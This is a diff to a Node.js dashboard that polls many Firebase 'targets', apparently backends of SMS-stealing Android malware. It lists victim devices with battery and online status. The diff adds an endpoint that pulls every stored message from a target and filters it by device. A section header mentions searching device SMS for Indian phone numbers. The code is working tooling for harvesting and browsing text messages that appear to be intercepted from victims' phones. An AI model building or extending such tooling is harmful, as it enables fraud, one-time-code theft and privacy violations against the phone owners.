@@ -680,6 +680,8 @@ async function pollTarget(target) {
         bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
         brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || dinfo.deviceId || 'Unknown';
         isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        // Store the deviceId field as objId so SMS link can filter correctly
+        objId = dinfo.deviceId || did;
       }
 
       upsertDevice(target, actualDid, {
@@ -740,7 +742,10 @@ function getSmsLink(target, deviceId, objId) {
   if (schema === 1)    return `${url}/All_Users/sms/${deviceId}.json?print=pretty`;
   if (schema === 4)    return `${url}/clients/${deviceId}/messages.json?print=pretty`;
   if (schema === 16)   return `${url}/data/${deviceId}/messages.json?print=pretty`;
-  if (schema === 17)   return `${url}/messages.json?print=pretty`;
+  if (schema === 17) {
+    // Server-side filtered endpoint — avoids needing Firebase index
+    return `/api/url/${target.id}/device/${deviceId}/sms`;
+  }
   if ([2,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
   if (schema === '8a' || schema === '8b') {
     const actual = (objId && objId !== 'N/A') ? objId : deviceId;
@@ -945,6 +950,33 @@ app.get('/api/url/:id/live', async (req, res) => {
     battery: d.last_battery   || 'N/A',
   })).sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
   res.json({ id, total: devices.length, online: devices.filter(d => d.status === 'online').length, devices });
+});
+
+// ── Schema 17: serve filtered SMS for a specific device (no Firebase index needed)
+app.get('/api/url/:id/device/:deviceId/sms', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const deviceId = req.params.deviceId;
+  const target = [...TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  if (!target || target.schema !== 17) return res.status(404).json({ error: 'Not schema 17' });
+
+  try {
+    const allMsgs = await fbFetch(`${target.url}/messages.json`);
+    if (!allMsgs) return res.json({});
+    // Filter by deviceID field matching deviceId (outer client key)
+    const db = getTargetDb(target);
+    const dev = db[deviceId];
+    const filterDid = dev?.obj_id !== 'N/A' ? dev?.obj_id : deviceId;
+    const filtered = {};
+    for (const [k, v] of Object.entries(allMsgs)) {
+      if (v && (v.deviceID === filterDid || v.deviceId === filterDid)) {
+        filtered[k] = v;
+      }
+    }
+    res.setHeader('Content-Type', 'application/json');
+    res.send(JSON.stringify(filtered, null, 2));
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 // ── SearchNo: find Indian phone numbers in device SMS ─────────────────────────
